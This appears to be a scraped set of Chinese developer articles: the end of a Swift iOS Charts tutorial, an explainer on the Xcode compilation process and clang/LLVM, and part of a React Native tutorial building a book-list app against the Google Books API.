        let months = [""Jan"", ""Feb"", ""Mar"", ""Apr"", ""May"", ""Jun""]
        let unitsSold = [20.0, 4.0, 6.0, 3.0, 12.0, 16.0]
        
        setChart(months, values: unitsSold)
        
    }
    
    func setChart(dataPoints: [String], values: [Double]) {
        
        var dataEntries: [ChartDataEntry] = []
        
        for i in 0..&lt;dataPoints.count {
            let dataEntry = ChartDataEntry(value: values[i], xIndex: i)
            dataEntries.append(dataEntry)
        }
        
        let pieChartDataSet = PieChartDataSet(yVals: dataEntries, label: ""Units Sold"")
        let pieChartData = PieChartData(xVals: dataPoints, dataSet: pieChartDataSet)
        pieChartView.data = pieChartData
        
        var colors: [UIColor] = []
        
        for i in 0..&lt;dataPoints.count {
            let red = Double(arc4random_uniform(256))
            let green = Double(arc4random_uniform(256))
            let blue = Double(arc4random_uniform(256))
            
            let color = UIColor(red: CGFloat(red/255), green: CGFloat(green/255), blue: CGFloat(blue/255), alpha: 1)
            colors.append(color)
        }
        
        pieChartDataSet.colors = colors
        
        
        let lineChartDataSet = LineChartDataSet(yVals: dataEntries, label: ""Units Sold"")
        let lineChartData = LineChartData(xVals: dataPoints, dataSet: lineChartDataSet)
        lineChartView.data = lineChartData
        
    }
 
}</code></pre>
<p>以上代码中，我们将 Charts 框架导入类中，像之前创建柱形图那样，创建一个饼状图和一个线形图。但需要注意的是，在柱形图表例中我们使用的是 BarChartDataEntry，而现在使用父类 ChartDataEntry 创建数据项。</p>
<p>运行应用，选择表格视图中的其他图表，可以看见一个线形图和有颜色的饼状图。你的应用可能跟下图不完全相同，因为饼状图的颜色是随机的。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004869282"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h2>结束语</h2>
<p>本篇文章大致介绍了使用 ios-charts 库创建的一些图表类型，大概涉及了自定义图表的一些内容。如果你想知道这个库的其他功能，你可以参考这个下载库自带的 ChartsDemo 项目的代码，也可以看看该项目的维基百科。<a href=""https://github.com/PhilJay/MPAndroidChart/wiki"" rel=""nofollow noreferrer"">这个链接</a>到 Wiki 页面会引导至 MPAndroidChart 项目文档。作者在写这篇文章时，还没有库的 <a href=""http://www.oneapm.com/mi/ios.html?utm_source=Community&amp;utm_medium=Article&amp;utm_term=chart&amp;utm_campaign=AugSoftArti&amp;from=matefiausc"" rel=""nofollow noreferrer"">iOS</a> 版本的文档说明，但其实 API 跟 Android 版本约95％都相同，当你百思不得其解时，Android 文档仍然可以派上用场。</p>
<p>你可以在这里下载<a href=""https://www.dropbox.com/s/9dq1onn6ndjvf1o/iOSChartsDemo.zip?dl=0"" rel=""nofollow noreferrer"">完整项目</a>。</p>
<p>下面列出可创建的图表类型。</p>
<h3>线形图（图例、简单的设计）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004869281"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>线形图（图例、简单的设计）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871226"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>线图（立方线）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871223"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>线图（单数据组）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871203"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>复合图（柱形图和线图）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871208"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>柱形图（图例、简单设计）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871210"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>柱形图（分组数据集）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871206"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>水平柱形图</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871211"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>饼状图（有选取）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871216"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>散点图（以方形、三角形、圆形等图例）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871213"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>K线图（针对财经数据）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871214"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>气泡图（由气泡区域覆盖来表示值）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871218"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h3>雷达图（蛛网图）</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004871221"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图"" title=""如何在Swift语言下用iOS Charts API制作漂亮图""></span></p>
<p><strong>本文系 <a href=""http://oneapm.com/index.html?utm_source=Common&amp;utm_medium=Articles&amp;utm_campaign=TechnicalArticles&amp;from=matefiseco"" rel=""nofollow noreferrer"">OneAPM</a> 工程师编译整理。想阅读更多技术文章，请访问 OneAPM <a href=""http://news.oneapm.com/?utm_source=TechCommunity&amp;utm_medium=TechArticle&amp;utm_campaign=JulSoftArti"" rel=""nofollow noreferrer"">官方博客</a>。</strong></p>

                ", 如何在 Swift 语言下使用 iOS Charts API 制作漂亮图表？,1531972097,521,1,854,1,1,https://segmentfault.com/a/1190000003111508
141,1,0,6,"
                    
<h3>编译过程</h3>
<p>基本的编译过程分为四个步骤：</p>
<ol>
<li><p>预处理（Pre-process）：把宏替换，删除注释，展开头文件，产生 <strong>.i</strong> 文件。</p></li>
<li><p>编译（Compliling）：把之前的 <strong>.i</strong> 文件转换成汇编语言，产生 <strong>.s</strong>文件。</p></li>
<li><p>汇编（Asembly）：把汇编语言文件转换为机器码文件，产生 <strong>.o</strong> 文件。</p></li>
<li><p>链接（Link）：对<strong>.o</strong>文件中的对于其他的库的引用的地方进行引用，生成最后的可执行文件（同时也包括多个 <strong>.o</strong> 文件进行 link）。</p></li>
</ol>
<p>然后通过解析 xcode 编译 log，可以发现 xcode 是根据 target 分开进行编译的。每个 target 的具体的编译过程也可以通过展开 log 日志获得。基本的格式就是首先简明一句说明要干什么，然后缩进的几行说明具体的操作。比如：</p>
<pre><code>(1) ProcessPCH /.../Pods-SSZipArchive-prefix.pch.pch Pods-SSZipArchive-prefix.pch normal armv7 objective-c com.apple.compilers.llvm.clang.1_0.compiler
    (2) cd /.../Dev/objcio/Pods
        setenv LANG en_US.US-ASCII
        setenv PATH ""...""
    (3) /.../Xcode.app/.../clang 
            (4) -x objective-c-header 
            (5) -arch armv7 
            ... configuration and warning flags ...
            (6) -DDEBUG=1 -DCOCOAPODS=1 
            ... include paths and more ...
            (7) -c 
            (8) /.../Pods-SSZipArchive-prefix.pch 
            (9) -o /.../Pods-SSZipArchive-prefix.pch.pch</code></pre>
<p>就是在处理 pch 头文件，首先切换到 pch 的目录下，然后设置环境变量，然后启动 clang 并进行一系列的配置。在这之后一般就会产生具体的 <code>.o</code>文件作为产出（一般是有多个，针对不同的平台架构分别有一个，不过一般紧接着会把这些聚合成一个通用的 library。）。同时注意，不同的 target 也是有编译顺序的，具体的要看 target 之间的依赖关系。</p>
<p>在 xcode 编译的过程中，大部分的命令都可以自解释，不过仍有个别的命令直接看是看不出来干嘛的，这里解释一下：<br><code>ld</code> :用于产生可执行文件。<br><code>libtool</code>：产生 lib 的工具。<br><strong>（这部分将会在之后的文章的编译具体过程进行讲解）</strong></p>
<p>接下来就是编译过程的控制，在 xcode 中可以通过<code> Build phases</code>,<code>Build settings</code>以及<code> Build rules</code>来进行控制。</p>
<p><strong>Build phases</strong>主要是用来控制从源文件到可执行文件的整个过程的，所以应该说是面向源文件的，包括编译哪些文件，以及在编译过程中执行一些自定义的脚本什么的。<br><strong>Build rules</strong> 主要是用来控制如何编译某种类型的源文件的，假如说相对某种类型的原文件进行特定的编译，那么就应该在这里进行编辑了。同时这里也会大量的运用一些 xcode 中的环境变量，完整的官方文档在这里：<a href=""https://developer.apple.com/library/mac/documentation/DeveloperTools/Reference/XcodeBuildSettingRef/1-Build_Setting_Reference/build_setting_ref.html#//apple_ref/doc/uid/TP40003931-CH3-SW105"" rel=""nofollow noreferrer"">Build Settings Reference</a><br><strong>Build settings</strong>则是对编译工作的细节进行设定，在这个窗口里可以看见大量的设置选项，从编译到打包再到代码签名都有，这里要注意 settings 的 section 分类，同时一般通过右侧的 inspector 就可以很好的理解选项的意义了。</p>
<p>最后，要说一下我们的工程文件<code>.pbxproj</code>,以上的所有的这些选项都保存在这个文件中。当然也包括 target 的信息，项目所有文件的信息，这个文件是一个文本文件，可以用文本编辑器打开。里头的内容基本是可读性比较强的。基本的思路很面向对象，每个东西都有属性，如果属性是另一个对象，值就是那个对象的一个『引用』，就是一串数字（唯一的）作为表示。每个对象都有这样的引用。</p>
<h3>编译器</h3>
<p>首先，编译器是做什么的？编译器是用来把源代码文件转换为更为低级的语言的（同时还有语句的静态分析），而 xcode 使用的clang 编译器的作用就是把源代码转换为更为低级的 LLVM IR(Intermedia Representation)，这个 LLVM IR 是操作系统无关的，然后 LLVM 通过这个中间语言来进行下一步的二进制文件的产出。得益于 LLVM 的三层架构，LLVM 可以有多个输入和输出（LLVM 的第一层架构是用于处理输入的，第二层用于优化 IR ，第三层用于输出）<em>这里遇到了一个问题，不了解到底 clang 和 LLVM 之间的关系是什么，估计得明白编译器是怎么做的才能明白。</em></p>
<blockquote><p>通常一个编译器可以编译多种语言，生成多个平台的代码，所以会划分前端和后端。有时候还有中端的说法。</p></blockquote>
<blockquote><p>前端是语言相关的，输出为抽象语法树；<br>后端是机器相关的，输出为机器代码。有些优化是机器无关的，这一部分可能被单列出来称为中端。</p></blockquote>
<blockquote><p>以gcc为例，前端生成的中间语言为GENERIC，之后转化为gimple做机器无关的优化，最后转化为RTL做机器相关优化并生成机器代码。<br>这三个部分就可以分别称为前端、中端、后端。不过gimple阶段是gcc 4之后才有的，gcc 3.x的版本优化全在RTL上。<br>而且实际实现的时候可能机器相关的优化也在gimple阶段实现（反过来RTL也有机器无关优化），划分不是那么明确。</p></blockquote>
<p>也就是说前段完成语法分析句法分析等相关的工作，并不会针对机器平台做想对应的优化。后端才是真正蟾蜍机器码的部分。clang 只是一个编译器的前前端部分。而 LLVM 这个术语不能一概而论，具体区别的在<a href=""http://blog.csdn.net/snsn1984/article/details/17716261"" rel=""nofollow noreferrer"">这篇博客</a>有讲述。</p>
<p>如果对编译器本身产生了兴趣，可以一方面可以看看编译原理（程序猿的三大浪漫之一），然后另一方面可以自己了解一个编译器应该怎么写。<br>这里有个<a href=""http://zhuanlan.zhihu.com/mosky/19878094"" rel=""nofollow noreferrer"">知乎专栏</a><br>同时还有<a href=""https://www.coursera.org/course/compilers"" rel=""nofollow noreferrer"">斯坦福大学的公开课</a>供学习参考。</p>

                ", 聊聊Xcode 中的编译过程以及编译器,1531972098,174,1,750,1,1,https://segmentfault.com/a/1190000003101087
142,1,0,6,"
                    
<p><strong>【编者按】本篇文章的作者是 Joyce Echessa——渥合数位服务创办人，毕业于台湾大学，近年来专注于协助客户进行 App 软体以及网站开发。本篇文章中，作者介绍通过 React Native 框架构建一个示例应用的开发过程，使得网络技术和移动开发碰撞出绚丽火花！</strong></p>

<p><a rel=""nofollow"" href=""http://news.oneapm.com/react-native-introduction/"">React Native 简介：用 JavaScript 搭建 iOS 应用 (1)</a></p>

<p>在 render()函数中，使用 TabBarIOS 组件创建一个分页列。别忘了添加你使用的组件到解构赋值中，否则以后调用都需要使用完整名称，比如 React.TabBarIOS。</p>

<p>我们创建了两个分页列项目。我们为每一个项目设置选中状态，并定义一个该项目被点击时所调用的函数。以精选标签为例，我们之前定义的 selectedTab 状态为「featured」，那么 selected 设置为 true，否则将被设置为 false。对于搜索标签页也一样，需要检查 selectedTab 是否为「search」。一旦项目的 selected 设置为true，将成为激活状态标签。我们用系统图标表示标签栏项目。</p>

<p>需要注意的是，我们使用的自定义组件标签，和其他的组件一样。例如，我们需要相应的模块，并将其分配给一个变量，你可以使用变量来调用模块。结果如同组件类的 render()函数一样，成为文件代码的一部分。提醒一下，作者习惯使用变量名作为各自的类名，但这并不是必须，你可以用你喜欢的名称。</p>

<p>当一个标签栏项目点击时，会调用在组件的 onPress 属性中定义的回调函数。函数会为 selectedTab 属性设置数值，这个属性将最终确定哪个是活动标签。</p>

<p>调用模拟器，按下 Command-R 重载该应用。正如下图所示。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/PEfxodA.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<h2>添加导航栏</h2>

<p>下一步，我们将添加一个导航栏，并将两个文件添加到项目中。这些都将作为相应标签出现在导航堆栈的根视图。分别命名文件为 BookList.js 和 SearchBooks.js。</p>

<p>在 BookList.js 添加以下代码。</p>

<pre><code>javascript</code><code class=""lang-javascript"">'use strict';

var React = require('react-native');

var {
    StyleSheet,
    View,
    Component
   } = React;

var styles = StyleSheet.create({

});

class BookList extends Component {
    render() {
        return (
            &lt;View&gt;
        &lt;/View&gt;             
        );
    }
}

module.exports = BookList;
</code></pre>

<p>在 SearchBooks.js 中添加以下代码。</p>

<pre><code>javascript</code><code class=""lang-javascript"">'use strict';

var React = require('react-native');

var {
    StyleSheet,
    View,
    Component
   } = React;

var styles = StyleSheet.create({

});

class SearchBooks extends Component {
    render() {
        return (
            &lt;View&gt;
        &lt;/View&gt;             
        );
    }
}

module.exports = SearchBooks;
</code></pre>

<p>在这两个文件中创建空白视图模块，并导出该模块。</p>

<p>按照以下代码修改 Featured.js。</p>

<pre><code>javascript</code><code class=""lang-javascript"">'use strict';

var React = require('react-native');
var BookList = require('./BookList');

var {
    StyleSheet,
    NavigatorIOS,
    Component
   } = React;

var styles = StyleSheet.create({
    container: {
        flex: 1
    }
});

class Featured extends Component {
    render() {
        return (
            &lt;NavigatorIOS
                style={styles.container}
                initialRoute={{
            title: 'Featured Books',
            component: BookList
            }}/&gt;            
        );
    }
}

module.exports = Featured;
</code></pre>

<p>以上代码使用 NavigatorIOS 组件来构造一个导航控制器。我们将其初始路径设定为 BookList 组件（这意味着 BookList 为其根视图），并设置导航栏上方的标题。<br>
接着用以下代码修改 Search.js。</p>

<pre><code>javascript</code><code class=""lang-javascript"">'use strict';

var React = require('react-native');
var SearchBooks = require('./SearchBooks');

var {
    StyleSheet,
    NavigatorIOS,
    Component
   } = React;

var styles = StyleSheet.create({
    container: {
        flex: 1
    }
});

class Search extends Component {
    render() {
        return (
            &lt;NavigatorIOS
                style={styles.container}
                initialRoute={{
            title: 'Search Books',
            component: SearchBooks
        }}/&gt;            
        );
    }
}

module.exports = Search;
</code></pre>

<p>正如在 Featured.js 一样，以上代码创建导航控制器，再设置其初始路径，接着为它设置标题。</p>

<p>重载应用，你可以看到以下界面。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/pyok2qf.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<h2>获取并显示数据</h2>

<p>现在，我们开始将数据添加到视图中。起初，我们用虚构数据构建视图，之后再从 API 获取真实的数据。</p>

<p>在 BookList.js 中其他变量声明的文件顶部，添加以下代码。</p>

<pre><code>javascript</code><code class=""lang-javascript"">var FAKE_BOOK_DATA = [
    {volumeInfo: {title: 'The Catcher in the Rye', authors: ""J. D. Salinger"", imageLinks: {thumbnail: 'http://books.google.com/books/content?id=PCDengEACAAJ&amp;printsec=frontcover&amp;img=1&amp;zoom=1&amp;source=gbs_api'}}}
];
</code></pre>

<p>如下图所示修改解构赋值，以添加更多组件。</p>

<pre><code>javascript</code><code class=""lang-javascript"">var {
    Image,
    StyleSheet,
    Text,
    View,
    Component,
   } = React;
</code></pre>

<p>添加如下样式。</p>

<pre><code>javascript</code><code class=""lang-javascript"">var styles = StyleSheet.create({
    container: {
        flex: 1,
        flexDirection: 'row',
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#F5FCFF',
        padding: 10
    },
    thumbnail: {
        width: 53,
        height: 81,
        marginRight: 10
    },
    rightContainer: {
        flex: 1
    },
    title: {
        fontSize: 20,
        marginBottom: 8
    },
    author: {
        color: '#656565'
    }
});
</code></pre>

<p>如下图所示，修改 BookList 类。</p>

<pre><code>javascript</code><code class=""lang-javascript"">class BookList extends Component {
    render() {
    var book = FAKE_BOOK_DATA[0];
        return (
            &lt;View style={styles.container}&gt;
                &lt;Image source={{uri: book.volumeInfo.imageLinks.thumbnail}}
                            style={styles.thumbnail} /&gt;
                &lt;View style={styles.rightContainer}&gt;
                    &lt;Text style={styles.title}&gt;{book.volumeInfo.title}&lt;/Text&gt;
                    &lt;Text style={styles.author}&gt;{book.volumeInfo.authors}&lt;/Text&gt;
                &lt;/View&gt;
            &lt;/View&gt;
        );
    }
}
</code></pre>

<p>重新加载应用，可以看到下图界面。<br><span class=""img-wrap""><img data-src=""http://i.imgur.com/AqPnYSh.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<p>在上面的代码中，我们创建一个 JSON 对象，非常类似于从 API 调用的对象。我们为一本书的对象创建属性和值。在类文件中，我们使用虚构数据，只为了得到第一个元素，并用它来填充我们的视图。我们使用图像组件来加载图像到视图。需要注意的是，我们在样式表中设定其宽度和高度。如果在样式表中指定图像的尺寸，那么在视图中将看不到图像。</p>

<p>我们为容器指定了 flexDirection 为「row」的样式。这样的话，元素的子代也将继承该风格，默认值是水平布局而不是纵向布局。请注意，我们是如何在组件内包装其他组件的。在上面代码中，主容器中有两个子元素——图像和视图。视图也有自己的子类——两个文本组件。</p>

<p>先布局图像组件，然后再将视图（rightContainer）水平放置在它旁边。我们为 rightContainer 指定的 flex 风格为1。这使得该视图组件占据剩余空间，而不会遮挡图像组件。如果你想看 flex 样式的效果，可以为 rightContainer 添加以下代码。</p>

<pre><code>javascript</code><code class=""lang-javascript"">backgroundColor: 'red'
</code></pre>

<p>重新加载应用，你会看到空间被 rightContainer 样式组件占满。但它不会遮挡到其他组件。之所以没有延伸到整个屏幕，是因为外容器设定了留白，而图片也设置了右边界。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/YnnxGtI.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<p>删除 rightContainer 的 flex 设定，再重新加载 App。现在组件只会占据适应其内容的足够空间。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/Oj2HQjI.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<p>如果将 thumbnail 和 rightContainer 的  flex 样式设置为2，它们将会占据同样的宽度，比例为2:2（或者1:1）。你可以将其设置为任何需要的数值，比例会做出相应的改变。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/v2Dqexe.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<p>你可以尝试不同的比例以得到你想要的结果。让我们回到之前为 rightContainer 添加红色背景的那一步，继续下面的步骤。</p>

<h2>添加列表视图</h2>

<p>React Native 有一个 ListView 组件，显示数据的滚动行——也就是 iOS 中的表视图。</p>

<p>首先，修改解构语句显示我们添加的更多的组件。</p>

<pre><code>javascript</code><code class=""lang-javascript"">var {
    Image,
    StyleSheet,
    Text,
    View,
    Component,
    ListView,
    TouchableHighlight
   } = React;
</code></pre>

<p>添加以下代码到样式表中。</p>

<pre><code>javascript</code><code class=""lang-javascript"">separator: {
       height: 1,
       backgroundColor: '#dddddd'
   }
</code></pre>

<p>添加以下构造函数到 BookList 类。</p>

<pre><code>javascript</code><code class=""lang-javascript"">constructor(props) {
       super(props);
       this.state = {
           dataSource: new ListView.DataSource({
               rowHasChanged: (row1, row2) =&gt; row1 !== row2
           })
       };
   }
</code></pre>

<p>最后添加以下函数。</p>

<pre><code>javascript</code><code class=""lang-javascript"">componentDidMount() {
    var books = FAKE_BOOK_DATA;
    this.setState({
        dataSource: this.state.dataSource.cloneWithRows(books)
    });
   }
</code></pre>

<p>在构造函数中，我们创建了一个 ListView.DataSource 对象，并将其分配给 dataSource 属性。DataSource 是一个接口，ListView 用它来确定在更新 UI 过程中哪些行发生了变化。我们提供了一个可以比较两列是否相同的函数，用于确定数据列表是否变化。</p>

<p>当组件被加载到 UI 视图时，会调用 componentDidMount()函数。该函数一旦被调用，我们用数据对象中的数据来设置 datasource 属性。</p>

<p>你可以使用下面的代码来修改 render()函数。</p>

<pre><code>javascript</code><code class=""lang-javascript"">render() {
    return (
        &lt;ListView
            dataSource={this.state.dataSource}
            renderRow={this.renderBook.bind(this)}
            style={styles.listView}
            /&gt;
    );
}
</code></pre>

<p>将下面的函数添加到 BookList 类。</p>

<pre><code>javascript</code><code class=""lang-javascript"">renderBook(book) {
       return (
            &lt;TouchableHighlight&gt;
                &lt;View&gt;
                    &lt;View style={styles.container}&gt;
                        &lt;Image
                            source={{uri: book.volumeInfo.imageLinks.thumbnail}}
                            style={styles.thumbnail} /&gt;
                        &lt;View style={styles.rightContainer}&gt;
                            &lt;Text style={styles.title}&gt;{book.volumeInfo.title}&lt;/Text&gt;
                            &lt;Text style={styles.author}&gt;{book.volumeInfo.authors}&lt;/Text&gt;
                        &lt;/View&gt;
                    &lt;/View&gt;
                    &lt;View style={styles.separator} /&gt;
                &lt;/View&gt;
            &lt;/TouchableHighlight&gt;
       );
   }
</code></pre>

<p>以上代码在 render()函数中创建了一个 ListView 组件。这里的 datasource 属性与之前设定的数值一致。然后调用 renderBook()函数显示 ListView 中的各列数据。</p>

<p>在 renderBook()函数中，我们使用 TouchableHighlight 组件。这是一个包装组件，能让视图正确响应点击行为。一旦点击，该包装组件的透明度就会降低，可以允许底层颜色透过，使得视图变暗或变色。这样的话，如果你点击一个 ListView 行，你会看到高亮色，就像之前设置的选择表格视图单元格时的响应一样。我们在分离器的底部添加一个样式为 separator 的空视图组件。这样的设定下，视图会出现一个灰色的水平线，便于分割每行项目。</p>

<p>重载该应用，你会看到只有一个单元的表格视图。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/R46t6ex.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<p>现在将真实数据加载到应用中。</p>

<p>从文件中移除 FAKE_BOOK_DATA 变量，并添加以下代码。这是加载数据的网址。</p>

<pre><code>javascript</code><code class=""lang-javascript"">var REQUEST_URL = 'https://www.googleapis.com/books/v1/volumes?q=subject:fiction';
</code></pre>

<p>修改解析声明。</p>

<pre><code>javascript</code><code class=""lang-javascript"">var {
    Image,
    StyleSheet,
    Text,
    View,
    Component,
    ListView,
    TouchableHighlight,
    ActivityIndicatorIOS
   } = React;
</code></pre>

<p>添加以下样式设定。</p>

<pre><code>javascript</code><code class=""lang-javascript"">listView: {
       backgroundColor: '#F5FCFF'
   },
   loading: {
       flex: 1,
       alignItems: 'center',
       justifyContent: 'center'
   }
</code></pre>

<p>用下面的代码修改构造函数。我们为组件的状态对象添加另一个属性，用来判断视图是否成功加载。</p>

<pre><code>javascript</code><code class=""lang-javascript"">constructor(props) {
       super(props);
       this.state = {
           isLoading: true,
           dataSource: new ListView.DataSource({
               rowHasChanged: (row1, row2) =&gt; row1 !== row2
           })
       };
   }
</code></pre>

<p>按下列代码修改 componentDidMount()函数，并添加 fetchData()函数。 fetchData()将调用 Google 图书 API，当它响应操作时，会将获取的数据设置为 DataSource 属性，同时将 isLoading 设置为 true。</p>

<pre><code>javascript</code><code class=""lang-javascript"">componentDidMount() {
       this.fetchData();
   }

   fetchData() {
       fetch(REQUEST_URL)
       .then((response) =&gt; response.json())
       .then((responseData) =&gt; {
           this.setState({
               dataSource: this.state.dataSource.cloneWithRows(responseData.items),
               isLoading: false
           });
       })
       .done();
   }
</code></pre>

<p>修改 render()函数并添加 renderLoadingView()。我们添加一个检查 isLoading，如果它的值为 true，就回到由 renderLoadingView()返回的视图。这个视图显示活动指示灯（一个转盘），以及「正在载入书籍...」的字样。当加载完成后，你应该看到表中的图书清单。</p>

<pre><code>javascript</code><code class=""lang-javascript"">render() {
       if (this.state.isLoading) {
           return this.renderLoadingView();
       }

       return (
            &lt;ListView
                dataSource={this.state.dataSource}
                renderRow={this.renderBook.bind(this)}
                style={styles.listView}
                /&gt;
        );
}  

renderLoadingView() {
    return (
        &lt;View style={styles.loading}&gt;
            &lt;ActivityIndicatorIOS
                size='large'/&gt;
            &lt;Text&gt;
                Loading books...
            &lt;/Text&gt;
        &lt;/View&gt;
    );
}
</code></pre>

<p>重新加载应用，你会看到类似下图的界面。</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/BfChkEa.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""React Native 简介：用 JavaScript 搭建 iOS 应用(2)""></span></p>

<h2>添加详情视图</h2>

<p>如果你点击表中的一个单元格，单元格将会突出显示，但不会响应其它操作。我们将添加一个详情视图，以显示选择当前书的详细信息。</p>

<p>在项目中新建文件，并命名为 BookDetail.js。将下面的代码贴在该文件中。</p>

<pre><code>javascript</code><code class=""lang-javascript"">'use strict';

var React = require('react-native');

var {
    StyleSheet,
    Text,
    View,
    Component,
    Image
   } = React;

var styles = StyleSheet.create({
    container: {
        marginTop: 75,
        alignItems: 'center'
    },
    image: {
        width: 107,
        height: 165,
        padding: 10
    },
    description: {
        padding: 10,
        fontSize: 15,
        color: '#656565'
    }
});

class BookDetail extends Component {
    render() {
        var book = this.props.book;
        var imageURI = (typeof book.volumeInfo.imageLinks !== 'undefined') ? book.volumeInfo.imageLinks.thumbnail : '';
        var description = (typeof book.volumeInfo.description !== 'undefined') ? book.volumeInfo.description : '';
        return (
            &lt;View style={styles.container}&gt;
                &lt;Image style={styles.image} source={{uri: imageURI}} /&gt;
                &lt;Text style={styles.description}&gt;{description}&lt;/Text&gt;
            &lt;/View&gt;
        );
    }
}

module.exports = BookDetail;
</code></pre>

<p>上述代码的大部分内容，我们之前已经讨论过，这里不再赘述。之前没接触过的是 props 属性，其用途是获取数据。通过设置 props 属性，将数据传递到这个类。在代码中，我们先获得数据，随后用数据填充视图。</p>

<p>需要注意的是，我们设置了容器的上边界。如果不这样的话，视图将从屏幕的最顶部开始，从而导致某些元素被导航栏遮挡。</p>

<p>在 BookList.js 中添加以下代码。</p>

<pre><code>javascript</code><code class=""lang-javascript"">var BookDetail = require('./BookDetail');
</code></pre>

<p>修改 BookList 类中 render()函数的 TouchableHighlight。</p>

<pre><code>javascript</code><code class=""lang-javascript"">&lt;TouchableHighlight onPress={() =&gt; this.showBookDetail(book)}  underlayColor='#dddddd'&gt;
</code></pre>

<p>上述代码指定了当某列书籍被点击时响应一个回调函数。粘贴下面的函数到该类。这将 BookDetail 视图推送到导航堆栈中，并设置导航栏上的标题可见。然后将该选中行有关的图书对象传递给 BookDetail 类。</p>

<pre><code>javascript</code><code class=""lang-javascript"">showBookDetail(book) {
       this.props.navigator.push({
           title: book.volumeInfo.title,
           component: BookDetail,
           passProps: {book}
       });
   }
</code></pre>

<p>重载该 App，你能看到当前选中书籍的详细信息。</p>

